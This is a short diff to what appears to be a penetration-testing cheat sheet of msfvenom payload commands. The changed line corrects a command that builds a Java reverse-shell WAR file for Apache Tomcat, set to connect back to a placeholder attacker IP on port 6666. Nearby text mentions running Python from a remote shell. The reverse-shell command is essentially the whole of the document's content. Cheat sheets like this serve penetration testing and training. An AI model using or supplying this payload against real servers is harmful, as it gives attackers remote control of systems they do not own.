@@ -28,7 +28,7 @@ This will create a file with the Python command to run from your remote shell.
 
 ## JAVA TOMCAT
 ### .WAR File
-`./msfvenom --platform=(OS TYPE) --payload=java/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -f shell.war`
+`./msfvenom --platform=(OS TYPE) --payload=java/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=6666 -f war -o shell.war`
 
 ## SunOS (Solaris)
 ### Elf File
